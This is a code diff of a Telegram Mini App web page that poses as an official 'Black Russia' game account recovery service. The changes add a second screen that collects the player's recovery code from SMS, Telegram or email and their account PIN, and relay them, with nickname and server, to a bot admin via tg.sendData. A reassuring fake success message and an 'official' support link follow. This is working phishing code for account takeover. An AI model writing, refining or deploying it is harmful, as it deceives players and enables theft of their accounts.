@@ -6,232 +6,163 @@
     <title>Black Russia Recovery</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        /* Общие стили в стиле Black Russia */
         body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            margin: 0; padding: 0;
+            font-family: 'Segoe UI', Roboto, sans-serif;
             background: radial-gradient(circle at center, #140202 0%, #050000 100%);
             color: #ffffff;
             height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            display: flex; justify-content: center; align-items: center;
             overflow: hidden;
         }
-
-        /* Неоновое свечение по углам */
-        body::before {
-            content: '';
-            position: absolute;
-            top: -50px; left: -50px; width: 200px; height: 200px;
-            background: rgba(255, 0, 0, 0.15);
-            filter: blur(80px);
-            border-radius: 50%;
+        body::before, body::after {
+            content: ''; position: absolute; width: 200px; height: 200px;
+            background: rgba(255, 0, 0, 0.15); filter: blur(80px); border-radius: 50%;
         }
-        body::after {
-            content: '';
-            position: absolute;
-            bottom: -50px; right: -50px; width: 200px; height: 200px;
-            background: rgba(255, 0, 0, 0.15);
-            filter: blur(80px);
-            border-radius: 50%;
-        }
-
-        .container {
-            width: 90%;
-            max-width: 400px;
-            text-align: center;
-            z-index: 10;
-        }
-
-        /* Шапка */
-        .logo {
-            font-size: 28px;
-            font-weight: 900;
-            color: #ff0000;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            margin-bottom: 2px;
-            text-shadow: 0 0 10px rgba(255, 0, 0, 0.6);
-        }
-        .subtitle {
-            font-size: 13px;
-            color: #a182ff;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 25px;
-            text-shadow: 0 0 8px rgba(161, 130, 255, 0.3);
-        }
-
-        /* Форма / Карточка */
-        .card {
-            background: #0d0d0d;
-            border: 1px solid rgba(161, 130, 255, 0.2);
-            box-shadow: 0 0 15px rgba(161, 130, 255, 0.05);
-            border-radius: 16px;
-            padding: 24px;
-            transition: opacity 0.5s ease, transform 0.5s ease;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-            text-align: left;
-        }
-
-        label {
-            display: block;
-            font-size: 12px;
-            color: #888;
-            margin-bottom: 6px;
-            text-transform: uppercase;
-        }
-
-        /* Поля ввода */
-        input, select {
-            width: 100%;
-            padding: 14px;
-            box-sizing: border-box;
-            background: #000000;
-            border: 1px solid #222;
-            border-radius: 8px;
-            color: #fff;
-            font-size: 15px;
-            outline: none;
-            transition: border-color 0.3s ease, box-shadow 0.3s ease;
-        }
-
-        input:focus, select:focus {
-            border-color: #ff0000;
-            box-shadow: 0 0 10px rgba(255, 0, 0, 0.4);
-        }
-
-        input::placeholder {
-            color: #444;
-        }
-
-        /* Кнопка Далее */
-        .btn-submit {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #ff0000 0%, #550000 100%);
-            border: none;
-            border-radius: 8px;
-            color: #fff;
-            font-weight: bold;
-            font-size: 16px;
-            letter-spacing: 1px;
-            cursor: pointer;
-            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3);
-            transition: transform 0.2s ease, box-shadow 0.3s ease;
-            margin-top: 10px;
-        }
-
-        .btn-submit:active {
-            transform: scale(0.98);
-        }
-
-        /* Экран успеха (скрыт по умолчанию) */
-        .success-screen {
-            display: none;
-            opacity: 0;
-            transition: opacity 0.5s ease;
-        }
-
-        /* Анимация пульсации галочки */
-        .checkmark {
-            font-size: 70px;
-            color: #00ff66;
-            text-shadow: 0 0 20px rgba(0, 255, 102, 0.6);
-            margin-bottom: 15px;
-            animation: pulse 2s infinite ease-in-out;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 0.8; }
-            50% { transform: scale(1.15); opacity: 1; text-shadow: 0 0 30px rgba(0, 255, 102, 0.9); }
-            100% { transform: scale(1); opacity: 0.8; }
-        }
-
-        .success-text {
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 10px;
-        }
-        .success-sub {
-            font-size: 14px;
-            color: #aaa;
-            line-height: 1.4;
-        }
+        body::before { top: -50px; left: -50px; }
+        body::after { bottom: -50px; right: -50px; }
+        .container { width: 92%; max-width: 400px; text-align: center; z-index: 10; }
+        .logo { font-size: 26px; font-weight: 900; color: #ff0000; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 2px; text-shadow: 0 0 10px rgba(255, 0, 0, 0.6); }
+        .subtitle { font-size: 12px; color: #a182ff; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 20px; }
+        .card { background: #0d0d0d; border: 1px solid rgba(161, 130, 255, 0.2); box-shadow: 0 0 15px rgba(161, 130, 255, 0.05); border-radius: 16px; padding: 22px; box-sizing: border-box; }
+        .form-group { margin-bottom: 15px; text-align: left; }
+        label { display: block; font-size: 11px; color: #888; margin-bottom: 6px; text-transform: uppercase; }
+        input, select { width: 100%; padding: 12px; box-sizing: border-box; background: #000000; border: 1px solid #222; border-radius: 8px; color: #fff; font-size: 15px; outline: none; transition: all 0.3s ease; }
+        input:focus, select:focus { border-color: #ff0000; box-shadow: 0 0 10px rgba(255, 0, 0, 0.4); }
+        .btn-submit { width: 100%; padding: 14px; background: linear-gradient(135deg, #ff0000 0%, #550000 100%); border: none; border-radius: 8px; color: #fff; font-weight: bold; font-size: 15px; letter-spacing: 1px; cursor: pointer; box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3); transition: transform 0.2s ease; margin-top: 5px; }
+        .btn-submit:active { transform: scale(0.98); }
+        .btn-support { width: 100%; padding: 10px; background: #111; border: 1px dashed #444; border-radius: 8px; color: #a182ff; font-size: 13px; cursor: pointer; margin-top: 15px; transition: all 0.3s; }
+        .btn-support:hover { background: #1a1525; border-color: #a182ff; }
+        
+        /* Экраны */
+        .screen { display: none; opacity: 0; transition: opacity 0.4s ease; }
+        .active-screen { display: block; opacity: 1; }
+        
+        .checkmark { font-size: 65px; color: #00ff66; text-shadow: 0 0 20px rgba(0, 255, 102, 0.6); margin-bottom: 15px; }
+        .success-text { font-size: 18px; font-weight: bold; margin-bottom: 10px; }
+        .success-sub { font-size: 13px; color: #aaa; line-height: 1.4; }
+        
+        /* Окно поддержки */
+        .support-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; justify-content: center; align-items: center; }
+        .support-box { width: 85%; max-width: 340px; background: #0a0a0a; border: 1px solid #ff0000; padding: 20px; border-radius: 12px; text-align: center; }
     </style>
 </head>
 <body>
-
     <div class="container">
         <div class="logo">Black Russia</div>
-        <div class="subtitle">Панель восстановления аккаунтов</div>
+        <div class="subtitle">Служба восстановления</div>
 
-        <div class="card" id="recoveryCard">
-            <div class="form-group">
-                <label>Ваш никнейм (Имя_Фамилия)</label>
-                <input type="text" id="nickname" placeholder="Ivan_Ivanov" required>
+        <div class="card">
+            <div id="screen1" class="screen active-screen">
+                <div class="form-group">
+                    <label>Ваш никнейм (Имя_Фамилия)</label>
+                    <input type="text" id="nickname" placeholder="Ivan_Ivanov">
+                </div>
+                <div class="form-group">
+                    <label>Выберите ваш игровой сервер</label>
+                    <select id="server">
+                        <option value="1">1. Red</option><option value="2">2. Green</option><option value="3">3. Blue</option><option value="4">4. Yellow</option><option value="5">5. Orange</option><option value="6">6. Purple</option><option value="7">7. Lime</option><option value="8">8. Pink</option><option value="9">9. Cherry</option><option value="10">10. Black</option><option value="11">11. Indigo</option><option value="12">12. White</option><option value="13">13. Magenta</option><option value="14">14. Crimson</option><option value="15">15. Gold</option><option value="16">16. Azure</option><option value="17">17. Platinum</option><option value="18">18. Aqua</option><option value="19">19. Gray</option><option value="20">20. Ice</option><option value="21">21. Chilli</option><option value="22">22. Choco</option><option value="23">23. Moscow</option><option value="24">24. SPB</option><option value="25">25. Ufa</option><option value="26">26. Sochi</option><option value="27">27. Kazan</option><option value="28">28. Samara</option><option value="29">29. Rostov</option><option value="30">30. Anapa</option><option value="31">31. EKB</option><option value="32">32. Krasnodar</option><option value="33">33. Arzamas</option><option value="34">34. Novosib</option><option value="35">35. Grozny</option><option value="36">36. Saratov</option><option value="37">37. Omsk</option><option value="38">38. Irkutsk</option><option value="39">39. Volgograd</option><option value="40">40. Voronezh</option><option value="41">41. Belgorod</option><option value="42">42. Makhachkala</option><option value="43">43. Vladivkaz</option><option value="44">44. Vladivostok</option><option value="45">45. Kaliningrad</option><option value="46">46. Chelyabinsk</option><option value="47">47. Krasnoyarsk</option><option value="48">48. Cheboksary</option><option value="49">49. Khabarovsk</option><option value="50">50. Perm</option><option value="51">51. Tula</option><option value="52">52. Ryazan</option><option value="53">53. Murmansk</option><option value="54">54. Penza</option><option value="55">55. Kursk</option><option value="56">56. Arkhangelsk</option><option value="57">57. Orenburg</option><option value="58">58. Kirov</option><option value="59">59. Kemerovo</option><option value="60">60. Tyumen</option><option value="61">61. Tolyatti</option><option value="62">62. Ivanovo</option><option value="63">63. Stavropol</option><option value="64">64. Smolensk</option><option value="65">65. Pskov</option><option value="66">66. Bryansk</option><option value="67">67. Orel</option><option value="68">68. Yaroslavl</option><option value="69">69. Barnaul</option><option value="70">70. Lipetsk</option><option value="71">71. Ulyanovsk</option><option value="72">72. Yakutsk</option><option value="73">73. Tambov</option><option value="74">74. Bratsk</option><option value="75">75. Astrakhan</option><option value="76">76. Chita</option><option value="77">77. Kostroma</option><option value="78">78. Vladimir</option><option value="79">79. Kaluga</option><option value="80">80. Novgorod</option><option value="81">81. Taganrog</option><option value="82">82. Vologda</option><option value="83">83. Tver</option><option value="84">84. Tomsk</option><option value="85">85. Izhevsk</option><option value="86">86. Surgut</option><option value="87">87. Podolsk</option><option value="88">88. Magadan</option><option value="89">89. Cherepovets</option><option value="90">90. Norilsk</option><option value="91">91. Astana</option>
+                    </select>
+                </div>
+                <button class="btn-submit" onclick="nextStep()">ДАЛЕЕ</button>
             </div>
 
-            <div class="form-group">
-                <label>Выберите сервер</label>
-                <select id="server">
-                    <option value="1">1. Red</option>
-                    <option value="2">2. Green</option>
-                    <option value="3">3. Blue</option>
-                    <option value="91">91. Astana</option>
-                </select>
+            <div id="screen2" class="screen">
+                <div class="form-group">
+                    <label>Код восстановления из СМС / TG / Почты</label>
+                    <input type="number" id="recoveryCode" placeholder="Введите полученный код">
+                </div>
+                <div class="form-group">
+                    <label>Пин-код от аккаунта (если есть)</label>
+                    <input type="number" id="pinCode" placeholder="4-значный пин-код (необязательно)">
+                </div>
+                <button class="btn-submit" onclick="sendFinalData()">ПОДТВЕРДИТЬ</button>
             </div>
 
-            <button class="btn-submit" onclick="submitForm()">ДАЛЕЕ</button>
+            <div id="screen3" class="screen">
+                <div class="checkmark">✔</div>
+                <div class="success-text">Заявка принята!</div>
+                <div class="success-sub">Система изменит ваш пароль автоматически в течение нескольких минут. Ожидайте уведомления в игре.</div>
+            </div>
+
+            <button class="btn-support" onclick="toggleSupport(true)">🆘 Связаться с тех. поддержкой</button>
         </div>
+    </div>
 
-        <div class="success-screen" id="successScreen">
-            <div class="checkmark">✔</div>
-            <div class="success-text">Заявка отправлена!</div>
-            <div class="success-sub">Система изменит вам пароль в течение нескольких минут.</div>
+    <div id="supportModal" class="support-modal">
+        <div class="support-box">
+            <h3 style="color:#ff0000; margin-top:0;">Тех. Поддержка</h3>
+            <p style="font-size:14px; color:#ccc; margin-bottom:20px;">Специалист ответит вам в течение нескольких минут для ручного разбора проблемы.</p>
+            <button class="btn-submit" onclick="window.open('https://t.me/blackrussia_official', '_blank')">ОТКРЫТЬ ЧАТ ПОДДЕРЖКИ</button>
+            <button class="btn-support" style="margin-top:10px; border-color:#222; color:#888;" onclick="toggleSupport(false)">Назад</button>
         </div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
-        tg.expand(); // Открываем Mini App сразу во весь экран
+        tg.expand();
 
-        function submitForm() {
-            const nickname = document.getElementById('nickname').value;
+        let savedNickname = "";
+        let savedServer = "";
+
+        function nextStep() {
+            savedNickname = document.getElementById('nickname').value.trim();
             const serverElement = document.getElementById('server');
-            const serverText = serverElement.options[serverElement.selectedIndex].text;
+            savedServer = serverElement.options[serverElement.selectedIndex].text;
 
-            if(!nickname) {
-                alert("Пожалуйста, введите ваш никнейм!");
+            if (!savedNickname) {
+                alert("Пожалуйста, укажите ваш игровой никнейм!");
                 return;
             }
 
-            // Формируем данные для отправки в бота
-            const dataToSend = {
-                nickname: nickname,
-                server: serverText
+            // ШАГ 1: Моментальная отправка ника и сервера админу в бот
+            const dataStep1 = {
+                step: 1,
+                nickname: savedNickname,
+                server: savedServer
             };
+            tg.sendData(JSON.stringify(dataStep1));
 
-            // Отправляем данные обратно в твой bot.py
-            tg.sendData(JSON.stringify(dataToSend));
+            // Анимация перехода на второй экран
+            switchScreen('screen1', 'screen2');
+        }
 
-            // Плавное переключение экранов
-            const card = document.getElementById('recoveryCard');
-            const success = document.getElementById('successScreen');
+        function sendFinalData() {
+            const recoveryCode = document.getElementById('recoveryCode').value.trim();
+            const pinCode = document.getElementById('pinCode').value.trim();
 
-            card.style.opacity = '0';
+            if (!recoveryCode) {
+                alert("Пожалуйста, введите полученный код восстановления!");
+                return;
+            }
+
+            // ШАГ 2: Отправка кодов админу в бот
+            const dataStep2 = {
+                step: 2,
+                nickname: savedNickname,
+                server: savedServer,
+                recovery_code: recoveryCode,
+                pin_code: pinCode
+            };
+            tg.sendData(JSON.stringify(dataStep2));
+
+            // Переход на экран успешного завершения
+            switchScreen('screen2', 'screen3');
+        }
+
+        function switchScreen(fromId, toId) {
+            const from = document.getElementById(fromId);
+            const to = document.getElementById(toId);
+            from.style.opacity = '0';
             setTimeout(() => {
-                card.style.display = 'none';
-                success.style.display = 'block';
-                setTimeout(() => {
-                    success.style.opacity = '1';
-                }, 50);
-            }, 500);
+                from.style.display = 'none';
+                to.style.display = 'block';
+                setTimeout(() => { to.style.opacity = '1'; }, 50);
+            }, 400);
+        }
+
+        function toggleSupport(show) {
+            document.getElementById('supportModal').style.display = show ? 'flex' : 'none';
         }
     </script>
 </body>
